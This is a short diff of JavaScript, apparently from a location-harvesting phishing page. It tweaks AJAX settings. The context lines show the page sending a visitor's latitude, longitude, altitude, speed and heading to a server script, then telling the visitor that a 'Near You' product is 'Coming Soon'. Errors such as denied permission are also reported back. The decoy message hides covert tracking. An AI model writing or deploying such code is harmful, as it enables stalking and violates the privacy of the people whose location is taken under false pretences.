@@ -24,7 +24,7 @@ function locate()
       url: './php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
       success: function(){$('#change').html('Coming Soon');},
-      dataType: 'text'
+      mimeType: 'text'
     });
     alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
   };
@@ -55,7 +55,6 @@ function showError(error)
     url: './php/error.php',
     data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
     success: function(){$('#change').html('Failed');},
-    dataType: 'text',
-    mimeType: 'text/html'
+    mimeType: 'text'
   });
 }
